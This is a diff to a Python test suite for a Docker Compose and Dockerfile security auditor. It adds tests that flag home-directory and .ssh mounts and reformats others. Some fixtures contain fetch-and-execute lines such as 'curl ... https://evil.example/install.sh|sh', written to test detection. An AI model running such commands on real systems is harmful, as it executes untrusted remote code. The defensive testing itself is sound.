@@ -122,6 +122,56 @@ def test_audit_compose_detects_host_sensitive_root() -> None:
     assert "host_sensitive_mount" in _critical_codes(findings)
 
 
+def test_audit_compose_home_root_is_critical() -> None:
+    """issue#1：家目录整体挂载仍 critical（等价 /home、/Users）。"""
+    text = _CLEAN_COMPOSE.replace(
+        "      - ../data:/app/data",
+        "      - ../data:/app/data\n      - /home:/host-home",
+    )
+    findings = audit_compose(text)
+    assert "host_sensitive_mount" in _critical_codes(findings)
+
+
+def test_audit_compose_user_home_root_is_critical() -> None:
+    """BUG-532：某用户的整个家目录（/home/alice）等价于 /home，critical。"""
+    text = _CLEAN_COMPOSE.replace(
+        "      - ../data:/app/data",
+        "      - ../data:/app/data\n      - /home/alice:/host-home:ro",
+    )
+    findings = audit_compose(text)
+    assert "host_sensitive_mount" in _critical_codes(findings)
+
+
+def test_audit_compose_user_home_root_macos_is_critical() -> None:
+    """BUG-532：/Users/<user> 整个家目录同样 critical。"""
+    text = _CLEAN_COMPOSE.replace(
+        "      - ../data:/app/data",
+        "      - ../data:/app/data\n      - /Users/alice:/host-home",
+    )
+    findings = audit_compose(text)
+    assert "host_sensitive_mount" in _critical_codes(findings)
+
+
+def test_audit_compose_home_subpath_nonsensitive_allowed() -> None:
+    """issue#1：家目录下的普通业务目录（extraVolumes 场景）放行。"""
+    text = _CLEAN_COMPOSE.replace(
+        "      - ../data:/app/data",
+        "      - ../data:/app/data\n      - /home/fenix-wang/.openclaw/workspace:/workspace:ro",
+    )
+    findings = audit_compose(text)
+    assert "host_sensitive_mount" not in _critical_codes(findings)
+
+
+def test_audit_compose_home_subpath_credential_dir_is_critical() -> None:
+    """issue#1：家目录下的凭据目录（.ssh 等）仍 critical。"""
+    text = _CLEAN_COMPOSE.replace(
+        "      - ../data:/app/data",
+        "      - ../data:/app/data\n      - /home/alice/.ssh:/ssh:ro",
+    )
+    findings = audit_compose(text)
+    assert "host_sensitive_mount" in _critical_codes(findings)
+
+
 def test_audit_compose_detects_host_sensitive_nested() -> None:
     text = _CLEAN_COMPOSE.replace(
         "      - ../data:/app/data",
@@ -171,7 +221,7 @@ def test_audit_compose_expansion_var_sensitive_is_critical() -> None:
     """BUG-184：${VAR}/~ 形式的敏感宿主路径不得按命名卷放行。"""
     text = _CLEAN_COMPOSE.replace(
         "      - ../data:/app/data",
-        '      - ../data:/app/data\n      - ${HOME}/.ssh:/root/.ssh:ro',
+        "      - ../data:/app/data\n      - ${HOME}/.ssh:/root/.ssh:ro",
     )
     findings = audit_compose(text)
     assert "host_sensitive_mount" in _critical_codes(findings)
@@ -329,58 +379,43 @@ def test_audit_dockerfile_clean_with_user() -> None:
 
 
 def test_audit_dockerfile_no_user_info() -> None:
-    text = "FROM python:3.13\nCMD [\"python\"]\n"
+    text = 'FROM python:3.13\nCMD ["python"]\n'
     findings = audit_dockerfile(text)
     assert "no_user" in _codes(findings)
     assert "no_user" not in _critical_codes(findings)
 
 
 def test_audit_dockerfile_explicit_root_warns() -> None:
-    text = "FROM python:3.13\nUSER root\nCMD [\"python\"]\n"
+    text = 'FROM python:3.13\nUSER root\nCMD ["python"]\n'
     findings = audit_dockerfile(text)
     assert "root_user" in _codes(findings)
 
 
 def test_audit_dockerfile_add_remote_url() -> None:
-    text = (
-        "FROM alpine\n"
-        'ADD https://example.com/file.tar.gz /tmp/file.tar.gz\n'
-        'CMD ["sh"]\n'
-    )
+    text = 'FROM alpine\nADD https://example.com/file.tar.gz /tmp/file.tar.gz\nCMD ["sh"]\n'
     findings = audit_dockerfile(text)
     assert "add_remote_url" in _critical_codes(findings)
 
 
 def test_audit_dockerfile_pipe_to_shell() -> None:
-    text = (
-        "FROM alpine\n"
-        "RUN curl -fsSL https://get.docker.com | sh\n"
-        'CMD ["sh"]\n'
-    )
+    text = 'FROM alpine\nRUN curl -fsSL https://get.docker.com | sh\nCMD ["sh"]\n'
     findings = audit_dockerfile(text)
     assert "pipe_to_shell" in _critical_codes(findings)
 
 
 def test_audit_dockerfile_pipe_to_shell_no_space_and_continuation() -> None:
     """BUG-330：``|sh`` 无空格与反斜杠续行不得绕过管道执行检测。"""
-    no_space = (
-        "FROM alpine\n"
-        "RUN curl -fsSL https://evil.example/install.sh|sh\n"
-        'CMD ["sh"]\n'
-    )
+    no_space = 'FROM alpine\nRUN curl -fsSL https://evil.example/install.sh|sh\nCMD ["sh"]\n'
     assert "pipe_to_shell" in _critical_codes(audit_dockerfile(no_space))
 
     continued = (
-        "FROM alpine\n"
-        "RUN curl -fsSL https://evil.example/install.sh \\\n"
-        "  | sh\n"
-        'CMD ["sh"]\n'
+        'FROM alpine\nRUN curl -fsSL https://evil.example/install.sh \\\n  | sh\nCMD ["sh"]\n'
     )
     assert "pipe_to_shell" in _critical_codes(audit_dockerfile(continued))
 
 
 def test_audit_dockerfile_copy_is_ok() -> None:
-    text = "FROM alpine\nCOPY package.json .\nUSER nobody\nCMD [\"sh\"]\n"
+    text = 'FROM alpine\nCOPY package.json .\nUSER nobody\nCMD ["sh"]\n'
     findings = audit_dockerfile(text)
     assert "add_remote_url" not in _codes(findings)
 
@@ -426,10 +461,8 @@ def test_audit_zip_members_symlink_detected() -> None:
     """
     import stat as stat_mod
 
-    symlink_mode = (stat_mod.S_IFLNK | 0o777)  # 已移位的 Unix 模式
-    findings = audit_zip_members(
-        ["index.html", "link.txt"], modes=[0, symlink_mode]
-    )
+    symlink_mode = stat_mod.S_IFLNK | 0o777  # 已移位的 Unix 模式
+    findings = audit_zip_members(["index.html", "link.txt"], modes=[0, symlink_mode])
     assert "zip_symlink" in _critical_codes(findings)
 
 
@@ -437,9 +470,7 @@ def test_audit_zip_members_symlink_short_modes_ok() -> None:
     """modes 短缺时仅按名称审计剩余成员，不越界（BUG-049 防御）。"""
     # modes 长度 1，只对应第一个成员；第二项无模式信息，仅按名称审计
     # 第一个成员 index.html 不是 symlink（mode=0），第二个按名称无发现
-    findings = audit_zip_members(
-        ["index.html", "link.txt"], modes=[0]
-    )
+    findings = audit_zip_members(["index.html", "link.txt"], modes=[0])
     assert findings == []
 
 
@@ -633,12 +664,8 @@ def test_validate_binding_localhost_string() -> None:
 
 
 def test_has_critical_true_false() -> None:
-    assert has_critical(
-        [SecurityFinding(LEVEL_CRITICAL, "x", "y")]
-    )
-    assert not has_critical(
-        [SecurityFinding(LEVEL_WARN, "x", "y")]
-    )
+    assert has_critical([SecurityFinding(LEVEL_CRITICAL, "x", "y")])
+    assert not has_critical([SecurityFinding(LEVEL_WARN, "x", "y")])
 
 
 def test_assert_no_critical_passes_when_clean() -> None:
@@ -654,6 +681,7 @@ def test_assert_no_critical_raises_on_critical() -> None:
 
 
 # ---- 集成：生成的 compose / Dockerfile 通过审计（WBS-25.03/04/05）-----------
+
 
 def test_generated_compose_passes_audit(tmp_path: Path) -> None:
     """generate_compose 产出的 compose.yaml 不得含 critical 安全问题。"""
@@ -747,6 +775,7 @@ def test_generate_dockerfile_rejects_add_remote_url(
 
 # ---- 集成：importer 对 pending 实例写风险提示（WBS-25.09）-----------------
 
+
 def test_importer_writes_risk_hint_for_pending(tmp_path: Path, monkeypatch) -> None:
     """detection.pending 时应额外写一条 security 事件，含风险提示。"""
     from local_webpage_access.config import example_config_text, load_config
@@ -771,10 +800,7 @@ def test_importer_writes_risk_hint_for_pending(tmp_path: Path, monkeypatch) -> N
         events = reg.list_events(result.instance_id)
         security_events = [e for e in events if e["event_type"] == "security"]
         assert len(security_events) >= 1, [e["event_type"] for e in events]
-        assert (
-            "风险" in security_events[0]["message"]
-            or "供应链" in security_events[0]["message"]
-        )
+        assert "风险" in security_events[0]["message"] or "供应链" in security_events[0]["message"]
     finally:
         reg.close()
 
